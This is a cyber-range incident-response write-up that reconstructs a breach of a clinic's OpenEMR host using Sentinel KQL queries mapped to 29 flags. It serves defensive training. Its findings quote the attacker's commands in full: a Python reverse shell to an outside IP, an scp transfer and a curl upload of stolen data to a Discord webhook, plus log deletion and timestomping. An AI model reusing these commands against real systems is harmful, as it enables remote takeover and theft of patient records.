
# 🏥 Rocky Clinic — IR Hunt 07
### OpenEMR Breach · End-to-End Incident Reconstruction
**Microsoft Sentinel · KQL · MITRE ATT&CK · Cyber Range**

![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat-square)
![Status](https://img.shields.io/badge/Status-Resolved-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Microsoft%20Sentinel-blue?style=flat-square)
![Questions](https://img.shields.io/badge/flags-29-orange?style=flat-square)
![Phases](https://img.shields.io/badge/Phases-8-purple?style=flat-square)

<img width="1076" height="400" alt="image" src="https://github.com/user-attachments/assets/0a2ba9a9-26d1-4674-983f-1f18e9788214" />

</div>

---
 
**Participant:** Amine Mouammine
 
**Date:** February 2026
 
## Platforms and Languages Leveraged
 
**Platforms:**
 
* Microsoft Sentinel
* Microsoft Defender for Endpoint (XDR)
* Log Analytics Workspace
**Languages/Tools:**
 
* Kusto Query Language (KQL) for querying device, network, file, and logon events
* Native Linux utilities: `sudo`, `sed`, `touch`, `curl`, `vim`, `cat`, `docker`, `systemctl`, `vipw`
---
 
# 📖 **Scenario**
 
Rocky Clinic runs OpenEMR, a cloud-hosted electronic health record platform managing patient data and clinical workflows. Earlier this month they identified a security incident. The initial access path is unknown.
 
This one began quietly. No ransomware, no alerts, no outage. Early activity inside the application looked like ordinary administration, but the pattern was deliberate exploration of identities, data, and workflows, before a pivot to the underlying host.
 
Your job is to reconstruct the whole arc. What the attacker learned, how they expanded access, how a low-noise look-around turned into full operational compromise, and how data left the building.
 
**What we do not yet know:**
 
* The initial access path (still unattributed)
* What persisted, and whether it survives a reboot
* How control was established and data moved out
* What the operator did to cover the trail
Evidence sits in the Sentinel workspace for this host. The investigation window is **4 to 14 February 2026 UTC**.
 
🎯 Your job is simple: Prove what really happened.
 
🧭 Follow the signs. Trust the data. Question everything.
 
---
 
## 📋 Summary of Findings
 
| Flag | Objective | Finding |
| :--- | :--- | :--- |
| **1** | Identify Target Host FQDN | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| **2** | Determine Active Container Runtime | `Docker` |
| **3** | Capture Active Audit Command PID | `17507` |
| **4** | Extract Final Interactive Command Binary Checksum | `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d` |
| **5** | Locate Targeted/Compromised User Account | `it.admin` |
| **6** | Measure Scope of OS Fingerprinting | `4` |
| **7** | Verify Host OS Distribution Name | `RockyLinux` |
| **8** | Identify Privilege Escalation Command | `sudo -i` |
| **9** | Locate Database Container Interrogation | `docker inspect openemr-mariadb` |
| **10** | Extract Configuration Harvesting String | `sed -n 1,200p /etc/openemr/audit_export.env` |
| **11** | Isolate Volume Survey Command | `find /var/lib/docker/volumes -maxdepth 3 -type f` |
| **12** | Pinpoint Persistent Database Storage Directory | `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data` |
| **13** | Identify Exploited Scheduled Script Path | `/opt/backup/scripts/backup_manifest.sh` |
| **14** | Identify Low-Profile Data Staging Target | `/var/lib/integrations` |
| **15** | Expose Rogue Unauthorized Local Account | `system` |
| **16** | Capture Alternative Credential Tool Hash | `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` |
| **17** | Isolate Background Execution Unit | `integration-monitor.service` |
| **18** | Expose Non-Telemetry Configuration Builder | `cat` |
| **19** | Identify Armed Launcher Service File Checksum | `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8` |
| **20** | Capture Outbound Connection Launch Line | `python3 -c '...s.connect(("20.62.27.80",443))...'` |
| **21** | Record Reverse Shell Session PID | `8000` |
| **22** | Isolate Compiled Data Archive Filename | `integration_state_2026-02-10_22-00-01.tar.gz` |
| **23** | Identify Failed Secure Copy Transfer Command | `scp ... streetrack@20.62.27.80:/home/streetrack/` |
| **24** | Capture Successful External Data Pivot Method | `curl -F file=@... https://discord.com/api/webhooks/...` |
| **25** | Identify Exfiltration Flow Network Destination IP | `162.159.135.232:443` |
| **26** | Count Discrete Line Removal Transaction Total | `12` |
| **27** | Expose Log Manipulation Core Utility Engine | `sed` |
| **28** | Identify Forged Target Historical File Timestamp | `2026-02-06 12:00:00` |
| **29** | Identify EDR Threat Classification Model | `["Indicator Removal (T1070)","Timestomp (T1070.006)"]` |
 
---
 
## 🟦 Flag 01 – Identify Target Host Fully Qualified Domain Name (FQDN)
 
**Objective:** Isolate the exact fully qualified network device name of the cloud-hosted host environment deployment running the compromised clinic platform.
 
🕵️ **Query used:**
```kql
DeviceInfo
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName startswith "rocky83"
| project TimeGenerated, DeviceName, OSVersion
| top 1 by TimeGenerated desc
```
 
🧠 **Thought process:** A `DeviceInfo` lookup scoped to the investigation window and filtered for any device starting with "rocky83" returned a single authoritative record — the full internal cloud FQDN, confirming exactly which asset the rest of the hunt needed to anchor on.
 
<img width="945" height="193" alt="1" src="https://github.com/user-attachments/assets/c57f1078-03c6-4e30-8909-966f2205477e" />

**Finding: `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`**
 
---
 
## 🟦 Flag 02 – Determine Active Container Runtime Platform
 
**Objective:** Map the virtualization layer software architecture responsible for managing and running the individual OpenEMR application container instances on the system.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| summarize count() by ProcessCommandLine
| where ProcessCommandLine has "docker"
```
 
🧠 **Thought process:** Aggregating process command lines containing "docker" across the full window showed consistent container lifecycle commands (`docker ps`, `docker exec`, `docker inspect`) — confirming Docker as the runtime orchestrating OpenEMR's containers, which shaped how every later collection step had to be scoped.
 
<img width="1088" height="264" alt="2" src="https://github.com/user-attachments/assets/4ec303f0-0a45-41f9-b33c-249fbd30db34" />

**Finding: `Docker`**
 
---
 
## 🟦 Flag 03 – Capture Active Audit Command Process Identifier
 
**Objective:** Record the unique process identification number (PID) allocated by the Linux kernel to track the initial active session audit task checking for logged-in users.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where TimeGenerated == todatetime('2026-02-08T16:25:30.735889Z')
| where DeviceName == "rocky83"
| where ProcessCommandLine in ("w","who","users")
| order by TimeGenerated asc
| project TimeGenerated, ProcessId, ProcessCommandLine, FileName
```
 
🧠 **Thought process:** Searching the standard session-enumeration commands at the session start timestamp confirmed `w` was the very first command executed, with process ID 17507 — classic operator behavior to check who else is logged in before taking any further action. This timestamp became the anchor for every subsequent query in the hunt.
 
<img width="768" height="144" alt="3" src="https://github.com/user-attachments/assets/c59e3ff4-2b73-4e4f-beff-6868a6fd2726" />

**Finding: `17507`**
 
---
 
## 🟦 Flag 04 – Extract Final Interactive Command Binary Checksum
 
**Objective:** Identify the unique SHA256 cryptographic signature of the underlying binary image used by the operator right before executing final interactive cleanup commands.
 
🕵️ **Query used:**
```kql
let AnchorTime = datetime(2026-02-08T16:25:30.7352);
DeviceProcessEvents
| where DeviceName == "rocky83"
| where AccountName == "it.admin"
| where TimeGenerated >= AnchorTime
| where ProcessCommandLine contains "docker"
| order by TimeGenerated asc
| project TimeGenerated, ProcessId, FileName, ProcessCommandLine, SHA256,
    InitiatingProcessId, InitiatingProcessFileName
| take 1
```
 
🧠 **Thought process:** Anchoring the query to the exact session-start timestamp from Flag 03 (`2026-02-08T16:25:30.7352Z`) and walking forward chronologically — rather than scanning a fixed window — pinpointed the precise sequence of attacker activity. Filtering for any command containing "docker" and taking the first result in ascending order surfaced `docker ps`, executed via `bash`, with SHA256 `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d` — confirming a clean, unmodified system binary was used.
 
<img width="1228" height="180" alt="4" src="https://github.com/user-attachments/assets/b2c49ebf-2963-4920-993d-f47006469ca8" />

**Finding: `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d`**
 
---
 
## 🟦 Flag 05 – Locate Targeted/Compromised User Account
 
**Objective:** Track down the authentic local profile credentials leveraged by the malicious operator during anomalous remote session logons to establish an initial access path.
 
🕵️ **Query used:**
```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName == "rocky83"
| where LogonType == "RemoteInteractive"
| project Timestamp, AccountName, RemoteIP, LogonType, DeviceName
| order by Timestamp asc
```
 
🧠 **Thought process:** Filtering `DeviceLogonEvents` for `RemoteInteractive` sessions surfaced `it.admin` logging in repeatedly from a single external IP, `68.53.47.150`, alternating between `Network` and `Local` logon types — a pattern consistent with an attacker pivoting from remote access into an active local session, not routine administration.
 
<img width="990" height="224" alt="5" src="https://github.com/user-attachments/assets/6936f90b-4ed2-4a43-adb0-5da40b05526d" />



**Finding: `it.admin`**
 
---
 
## 🟦 Flag 06 – Measure Scope of OS Configuration Fingerprinting
 
**Objective:** Count the total number of individual configuration or distribution release files targeted under the system configuration directory (`/etc`) during host profiling.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where DeviceName == "rocky83"
| extend FilePath = extract(@"(/etc/\S*(?:release|os-release)\S*)", 1, ProcessCommandLine)
| where isnotempty(FilePath)
| summarize DistinctFiles=dcount(FilePath), Files=make_set(FilePath)
    by bin(TimeGenerated, 5m)
| sort by DistinctFiles desc
```
 
🧠 **Thought process:** Extracting the file path pattern and counting distinct values per 5-minute bin revealed four separate release files were read in a single fingerprinting pass — not a single curious glance, but systematic re-verification of the environment before escalating.
 
<img width="1086" height="181" alt="q06" src="https://github.com/user-attachments/assets/110b77a1-63a6-487d-a229-39b13239e9f0" />

**Finding: `4`**
 
---
 
## 🟦 Flag 07 – Verify Host Operating System Distribution Name
 
**Objective:** Determine the precise Linux system flavor powering the virtual host machine as captured by the internal tracking telemetry fields.
 
🕵️ **Query used:**
```kql
DeviceInfo
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky"
| summarize by OSDistribution
```
 
🧠 **Thought process:** The EDR's own `DeviceInfo` table is the authoritative source for OS fingerprinting — no reliance on attacker-readable files needed. It returned RockyLinux directly, independently corroborating what the attacker confirmed manually through `/etc/os-release` in Flag 06.
 
<img width="1080" height="155" alt="Q07" src="https://github.com/user-attachments/assets/9ac7a00e-ac86-4d87-b9d8-53963dbb7ae1" />

**Finding: `RockyLinux`**
 
---
 
## 🟦 Flag 08 – Identify Privilege Escalation Interface Command
 
**Objective:** Uncover the exact shell shortcut input used by the operator to bypass initial constraints and enter a fully privileged interactive root prompt.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where ProcessCommandLine has "sudo su" or ProcessCommandLine has "sudo -i"
| project TimeGenerated, ProcessId, FileName, ProcessCommandLine,
    SHA256, InitiatingProcessCommandLine, AccountName
| order by TimeGenerated desc
```
 
🧠 **Thought process:** Filtering for both common root-escalation patterns returned a consistent stream of `sudo -i` events from `it.admin`, all sharing the identical SHA256 — confirming the attacker never replaced the sudo binary itself, they simply abused legitimate access repeatedly across multiple sessions.
<img width="1051" height="285" alt="8" src="https://github.com/user-attachments/assets/2dfba05f-61d9-4176-95a0-596ee59372c8" />

**Finding: `sudo -i`**
 
---
 
## 🟦 Flag 09 – Locate Application Database Container Interrogation
 
**Objective:** Track down the high-privilege command line deployed immediately following escalation to evaluate container parameters and database settings.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
|where ProcessCommandLine contains "inspect"
| project TimeGenerated, ProcessId, FileName, ProcessCommandLine, SHA256, InitiatingProcessCommandLine,AccountName
| order by TimeGenerated  desc 
```
 
🧠 **Thought process:** Scoping the time window to immediately after the `sudo -i` escalation surfaced `docker inspect openemr-mariadb` — confirming the attacker already knew the exact container name and was validating control over the MariaDB backend before moving toward data collection.
 
<img width="1243" height="187" alt="9" src="https://github.com/user-attachments/assets/5d35a456-5d3a-466e-98be-0fa9c29ff411" />

**Finding: `docker inspect openemr-mariadb`**
 
---
 
## 🟦 Flag 10 – Extract Automation Configuration Harvesting String
 
**Objective:** Uncover the exact file manipulation command used to dump secrets, parameters, or configurations from internal application deployment stores.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where DeviceName == "rocky83"
| where TimeGenerated between (datetime(2026-02-09) .. datetime(2026-02-11))
| where ProcessCommandLine contains ".env"
| where InitiatingProcessCommandLine == "-bash"
| project TimeGenerated, AccountName, ProcessCommandLine, FileName, FolderPath
| order by TimeGenerated asc
```
 
🧠 **Thought process:** Searching for `.env` references inside non-interactive bash sessions surfaced a clean sequence: `ls`, `stat`, then `sed -n 1,200p` reading the full contents of `/etc/openemr/audit_export.env` — without ever opening an editor. This file held the OpenEMR database credentials, the single artifact that unlocked everything that followed.
 
<img width="1039" height="213" alt="q10" src="https://github.com/user-attachments/assets/b92d6ec6-3cd5-4d80-a040-ed33a8691974" />

**Finding: `sed -n 1,200p /etc/openemr/audit_export.env`**
 
---
 
## 🟦 Flag 11 – Isolate Storage Container Volume Survey Command
 
**Objective:** Pinpoint the recursive search utility command layout used to crawl host filesystem branches to catalog physical application file mappings.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-09T17:03:13Z) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where ProcessCommandLine has "/var/lib/docker"
| project TimeGenerated, AccountName, ProcessCommandLine, FileName
```
 
🧠 **Thought process:** Filtering for any command referencing the Docker volumes root directory surfaced `find /var/lib/docker/volumes -maxdepth 3 -type f` — a depth-limited recursive search, just deep enough to reach actual data files without drowning in container metadata noise.
 
<img width="1058" height="211" alt="11 12" src="https://github.com/user-attachments/assets/d281f28d-bb56-4bbf-98ed-9f7b0ce1e2db" />

**Finding: `find /var/lib/docker/volumes -maxdepth 3 -type f`**
 
---
 
## 🟦 Flag 12 – Pinpoint Persistent Database Storage Directory
 
**Objective:** Map the absolute, raw directory path on the local host storage drive where the background backend database cluster keeps data persistently.
 
🕵️ **Query used:** Same as Flag 11
 
🧠 **Thought process:** The output of the volume survey itself contained the answer — among the enumerated paths, `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data` stood out as the live MariaDB data directory, confirming exactly where patient records physically lived on disk.
 
<img width="1058" height="211" alt="11 12" src="https://github.com/user-attachments/assets/a073d542-ccbe-44d1-89a9-a958ddd3eecd" />

**Finding: `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data`**
 
---
 
## 🟦 Flag 13 – Identify Exploited Automated Scheduled Script Path
 
**Objective:** Isolate the complete system location of the internal, trusted repeating automation routine script targeted by the operator to stage malicious activities.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where DeviceName == "rocky83"
| where TimeGenerated between (datetime(2026-02-07T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where ProcessCommandLine has_any ("tee -a", "tee /opt", "sed -i", "chmod")
| where ProcessCommandLine has_any ("backup", "manifest", "export", "monitor")
| where InitiatingProcessCommandLine == "-bash"
| project TimeGenerated, AccountName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
| order by TimeGenerated asc
```
 
🧠 **Thought process:** Filtering for file-write and permission-change verbs combined with operational keywords surfaced `/opt/backup/scripts/backup_manifest.sh` — a script that already had legitimate reasons to run via cron, modified directly rather than replaced, blending malicious execution into an existing trusted rhythm.
 
<img width="1025" height="164" alt="image" src="https://github.com/user-attachments/assets/38ae7896-aa6a-40b2-b312-75b70103b4d1" />


**Finding: `/opt/backup/scripts/backup_manifest.sh`**
 
---
 
## 🟦 Flag 14 – Identify Low-Profile Data Staging Target
```kql
DeviceFileEvents
| where DeviceName has "rocky83"
| where InitiatingProcessAccountName == "root"
| where ActionType == "FileCreated"
| where TimeGenerated between (datetime(2026-02-09) .. datetime(2026-02-11))
| summarize count() by FolderPath
| order by count_ desc
```
 
**Objective:** Uncover the normal-looking operational folder path chosen by the attacker to aggregate and stage compressed instance data files for transit.
 
🧠 **Thought process:** Cross-referencing file operations against directory naming patterns across the host, `/var/lib/integrations` stood out as a path mimicking legitimate healthcare integration middleware naming — exactly the kind of directory that wouldn't draw a second look during a routine filesystem review.
 <img width="966" height="290" alt="13 14" src="https://github.com/user-attachments/assets/e8111074-af0e-4d68-95ba-8547c8ac2558" />

**Finding: `/var/lib/integrations`**
 
---
 
## 🟦 Flag 15 – Expose Rogue Unauthorized Local User Account
 
**Objective:** Reveal the deceptive system configuration identity profile created manually on the operating system to act as a stealthy backdoor.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-07) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where ProcessCommandLine contains "useradd"
| where ProcessCommandLine contains "system"
| project TimeGenerated, AccountName, ProcessCommandLine, ProcessId
| order by TimeGenerated asc
```
 
🧠 **Thought process:** Searching for `useradd` combined with the `--system` flag surfaced `sudo useradd --system --home-dir /nonexistent --shell /sbin/nologin svc.monitor` and a near-identical `svc.integration` account — both provisioned with no home directory and no login shell, deliberately mimicking how real service accounts are created.
 
<img width="1088" height="223" alt="15" src="https://github.com/user-attachments/assets/358676a0-5a2d-4f50-a018-8a0597c4e9cc" />

**Finding: `system`**
 
---
 
## 🟦 Flag 16 – Capture Alternative Credential Tool Binary Hash
 
**Objective:** Identify the SHA256 cryptographic checksum of the service binary run to bypass regular user utilities and directly adjust system password configurations.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName contains "it.admin"
| where FileName contains "vipw"
| project TimeGenerated, AccountName, ProcessCommandLine, FileName, SHA256
| take 1
```
 
🧠 **Thought process:** `vipw` opens `/etc/passwd` directly under a file lock, sidestepping the audit-friendly `useradd` command path entirely — a deliberate detection-evasion choice, since many monitoring rules alert specifically on `useradd`/`usermod` invocations and miss direct password-file editing tools.
 
<img width="1065" height="130" alt="16" src="https://github.com/user-attachments/assets/975e03b3-b2e2-4043-9a4d-743d109a6cac" />

**Finding: `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0`**
 
---
 
## 🟦 Flag 17 – Isolate Background Execution Unit Configuration
 
**Objective:** Find the explicit system service configuration filename initialized to facilitate persistent, unauthenticated code launches.
 
🕵️ **Query used:**
```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-02-07T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName == "rocky83"
| where FileName has ".service"
| where ActionType in ("FileCreated", "FileModified")
| project TimeGenerated, FileName, FolderPath, ActionType,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
 
🧠 **Thought process:** Filtering `DeviceFileEvents` for `.service` file activity surfaced `integration-monitor.service` landing directly in `/etc/systemd/system/` — the standard location systemd scans for unit files, with a naming convention deliberately mirroring legitimate healthcare integration tooling.
 


**Finding: `integration-monitor.service`**
 
---
 
## 🟦 Flag 18 – Expose Non-Telemetry Configuration Builder Tool
 
**Objective:** Identify the common utility core utility chosen to build configurations while avoiding process creation telemetry tied to normal text editors.
 
🧠 **Thought process:** The `InitiatingProcessFileName` field for the first `FileCreated` event on `integration-monitor.service` showed `cat`, not `vim` or `nano`. Writing a file via redirect avoids the editor swap files, recovery buffers, and process behavior signatures that endpoint tools commonly fingerprint.
 


**Finding: `cat`**
 
---
 
## 🟦 Flag 19 – Identify Armed Launcher Service File Checksum
 
**Objective:** Uncover the specific SHA256 string representing the customized service definition version that was loaded to initialize the reverse control channel.
 
🕵️ **Query used:**
```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-02-08T16:34:00) .. datetime(2026-02-14T16:37:10))
| where FileName endswith ".service"
| where ActionType in ("FileCreated", "FileModified", "FileRenamed")
| project TimeGenerated, DeviceName, FileName, FolderPath, ActionType, SHA256,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
 
🧠 **Thought process:** Three writes to `integration-monitor.service` appeared in sequence: the first via `cat` (a near-empty skeleton), a second via `vim` carrying the live payload, and a third also via `vim` with yet another hash. The middle write is the armed version — its SHA256 matches the timing of the C2 activation that followed.
 
<img width="1047" height="199" alt="Q19" src="https://github.com/user-attachments/assets/491e8e2a-9219-424c-a0b4-370fd86f89e6" />

**Finding: `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8`**
 
---
 
## 🟦 Flag 20 – Capture Outbound Connection Interactive Launch Line
 
**Objective:** Isolate the complete program command parameters used to spawn an external interactive connection socket to an outside listener.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where DeviceName contains  "rocky83"
| where TimeGenerated  between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ProcessCommandLine has_any ("/usr/bin/python3 -c" )
|where FileName contains "python3"
| project TimeGenerated, AccountName, ProcessId, ProcessCommandLine, FileName, InitiatingProcessFileName, InitiatingProcessId,AdditionalFields
| order by TimeGenerated asc
```
 
🧠 **Thought process:** Correlating network telemetry with process execution surfaced a Python3 one-liner combining `socket`, `subprocess`, and `os.dup2` to redirect stdin/stdout/stderr through a raw TCP socket connecting to `20.62.27.80:443` — the textbook reverse shell pattern, using port 443 to blend with normal HTTPS egress.
 


**Finding: `/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`**
 
---
 
## 🟦 Flag 21 – Record Reverse Shell Session Process Identifier
 
**Objective:** Document the core operational process ID assigned to track the active, interactive remote command shell spawned from the backlink.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName contains "it.admin"
| where FileName in ("sh", "bash", "dash")
| where ProcessCommandLine has "-i"
| project InteractiveShellPID = ProcessId, ParentPID = InitiatingProcessId,
    FileName, ProcessCommandLine, TimeGenerated, AccountName
```
 
🧠 **Thought process:** Mapping all interactive `/bin/sh -i` sessions across the investigation window and aligning timestamps with the Python3 reverse shell from Flag 20 pinpointed process ID **8000** as the spawned interactive session — appearing precisely at the moment the C2 connection went live.
 
<img width="1035" height="220" alt="21" src="https://github.com/user-attachments/assets/4f6e8aa7-017e-47f9-a1ac-eb7d08520f6a" />

**Finding: `8000`**
 
---
 
## 🟦 Flag 22 – Isolate Compiled Instance Data Archive Filename
 
**Objective:** Pinpoint the exact archive filename string chosen to compress and store collected target database and workflow entries.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName contains "it.admin"
| where ProcessCommandLine has_any ("zip","tar","gz","7z","rar","archive","cp","mv")
| project TimeGenerated, AccountName, ProcessId, ProcessCommandLine, FileName
| order by TimeGenerated desc
```
 
🧠 **Thought process:** Filtering for archive-related verbs under `it.admin` surfaced `integration_state_2026-02-10_22-00-01.tar.gz` — a name deliberately echoing the fake "integration" theme used throughout the persistence mechanism, keeping the cover story consistent end to end.
 <img width="1076" height="179" alt="22q23" src="https://github.com/user-attachments/assets/258125f7-0a94-4f6d-93c5-8995e813cd7a" />

**Finding: `integration_state_2026-02-10_22-00-01.tar.gz`**
 
---
 
## 🟦 Flag 23 – Identify Failed Secure Copy Transfer Command
 
**Objective:** Capture the exact network file copying syntax that failed to exit the network zone due to defensive egress filtering protocols.
 
🧠 **Thought process:** Before pivoting to a web-based exfil channel, the attacker tried the direct route: `scp integration_state_2026-02-10_22-00-01.tar.gz streetrack@20.62.27.80:/home/streetrack/`. This attempt named both the destination username and reused the same C2 IP from the reverse shell — but network egress controls blocked the SCP protocol outright.
 
<img width="1076" height="179" alt="22q23" src="https://github.com/user-attachments/assets/687d6e18-a7a5-4f64-b298-10b567f36e5f" />

**Finding: `scp integration_state_2026-02-10_22-00-01.tar.gz streetrack@20.62.27.80:/home/streetrack/`**
 
---
 
## 🟦 Flag 24 – Capture Successful External Data Pivot Method
 
**Objective:** Document the data-posting string used to successfully route target data over standard communication lanes directly to external SaaS platform channels.
 
🕵️ **Query used:** 
```kql
DeviceProcessEvents
| where DeviceName contains "rocky83"
| where TimeGenerated between (datetime(2026-02-13T20:00:00Z) .. datetime(2026-02-13T21:00:00Z))
| where ProcessCommandLine has "integration_state_2026-02-10_22-00-01.tar.gz"
| project TimeGenerated, AccountName, ProcessId, FileName, ProcessCommandLine, SHA256
| order by TimeGenerated asc
```

 
🧠 **Thought process:** Following the failed SCP attempt, the same archive was uploaded via `curl -F` to a Discord webhook endpoint. Discord's CDN runs over standard HTTPS on port 443 and is rarely blocked by corporate egress filtering, making it an effective Living-off-the-Land exfiltration channel.
 
<img width="600" src="docs/22q23.png"/>
**Finding: `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/1471960320636620832/he162lRQsMJ3kKOVBNeiHYutbubwZ0sC-vq7A_phLZx-q4VOS88q4xDOvhxrBqy6nu9K`**
 
---
 
## 🟦 Flag 25 – Identify Exfiltration Flow Network Destination IP
 
**Objective:** Map the destination infrastructure socket details (Remote IP Address and Port) used during the successful outward push of compressed data.
 
🕵️ **Query used:**
```kql
DeviceNetworkEvents
| where DeviceName contains "rocky83"
| where TimeGenerated between (datetime(2026-02-13T20:00:00Z) .. datetime(2026-02-13T21:00:00Z))
| where InitiatingProcessCommandLine has "curl"
| project TimeGenerated, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
 
🧠 **Thought process:** The same curl process responsible for the Discord upload resolved to `162.159.135.232:443` — a Cloudflare-fronted IP proxying Discord's CDN. This confirmed at the network layer, independent of process-level logs, exactly where the data physically landed.
 
<img width="1076" height="175" alt="25" src="https://github.com/user-attachments/assets/a73f5a9b-1c78-42ef-a2a5-5839ef8c130e" />

**Finding: `162.159.135.232:443`**
 
---
 
## 🟦 Flag 26 – Count Discrete Line Removal Transaction Total
 
**Objective:** Determine the total quantity of distinct targeted row removal tasks run to pull explicit tracking elements from internal diagnostic logs.
 
**Scope:**
- Host: `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`
- Logs: `/var/log/secure` AND `/var/log/messages`
- Time: `2026-02-11 16:13` → `16:16` UTC
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where DeviceName contains "rocky83"
| where TimeGenerated between (datetime(2026-02-11T16:13:00Z) .. datetime(2026-02-11T16:16:00Z))
| where ProcessCommandLine has "sed -i"
| where ProcessCommandLine  !has "sudo"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| project TimeGenerated, AccountName, ProcessId, ProcessCommandLine, FileName, InitiatingProcessFileName
| summarize count() by ProcessCommandLine
| order by count_ desc
```
 
🧠 **Thought process:** Counting distinct `sed -i` command lines within the three-minute window returned 12 separate operations — patterns targeting service and account identifiers across both log files. The precision was the tell: a wholesale truncation would have been faster but would have created an obvious gap; twelve targeted deletions preserved surrounding log noise while removing only the attacker's own fingerprints.
 


**Finding: `12`**
 
---
 
## 🟦 Flag 27 – Expose Log Manipulation Core Utility Engine
 
**Objective:** Identify the identity name of the raw stream editor utility deployed to make automated modifications directly on system log files.
 
🧠 **Thought process:** Every deletion command across both log files used the same binary: `sed`, invoked with the `-i` in-place edit flag. No editor was ever opened — `sed` allowed scriptable, repeatable, surgical line deletion without the telemetry an interactive editor session would generate.
 🕵️ **Query used:**
```kql
DeviceProcessEvents
| where DeviceName contains "rocky83"
| where TimeGenerated between (datetime(2026-02-11T16:13:00Z) .. datetime(2026-02-11T16:16:00Z))
| where ProcessCommandLine has "sed" and ProcessCommandLine has "-i"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| distinct ProcessCommandLine
```
<img width="1042" height="210" alt="26q27" src="https://github.com/user-attachments/assets/42106494-83e7-48bc-b72d-6f8e0c58bf2a" />

**Finding: `sed`**
 
---
 
## 🟦 Flag 28 – Identify Forged Target Historical File Timestamp
 
**Objective:** Record the manual timestamp configuration pushed into core security tracking logs to break down forensic timelines and conceal true causality.
 
🕵️ **Query used:**
```kql
DeviceProcessEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-09T22:00:00Z) .. datetime(2026-02-09T22:20:00Z))
| project TimeGenerated, AccountName, ProcessId, FileName, ProcessCommandLine
```
 
🧠 **Thought process:** Four `touch -d` events appeared in quick succession, all forging the same value: `"2026-02-06 12:00:00"` onto `/var/log/messages`. Backdating the file by five days was a direct attempt to make the log appear untouched since before the intrusion began.
 
<img width="953" height="179" alt="28" src="https://github.com/user-attachments/assets/ecf42daf-85ea-4bc6-a963-35014ef83aad" />

**Finding: `2026-02-06 12:00:00`**
 
---
 
## 🟦 Flag 29 – Identify EDR Threat Classification Model
 
**Objective:** Map the structural attack categorization codes applied by host sensors to log modification and timeline distortion behaviors.
 
🕵️ **Query used:**
```kql
AlertInfo
| where TimeGenerated between (datetime(2026-02-11T16:00:00Z) .. datetime(2026-02-11T17:00:00Z))
| where DetectionSource contains "EDR"
| project TimeGenerated, DetectionSource, AttackTechniques, Severity, Category, Title
```
 
🧠 **Thought process:** Despite the surgical log deletion and timestamp forging, Microsoft Defender's EDR independently flagged the activity twice, both classified under `DefenseEvasion` with the title "Suspicious timestamp modification" — mapping directly to MITRE's Indicator Removal and Timestomp techniques. This was the clearest evidence that automated detection succeeded where manual log review might have missed it.
 
![Uploading 29.png…]()

**Finding: `["Indicator Removal (T1070)","Timestomp (T1070.006)"]`**
 
---
 
## ✅ Conclusion
 
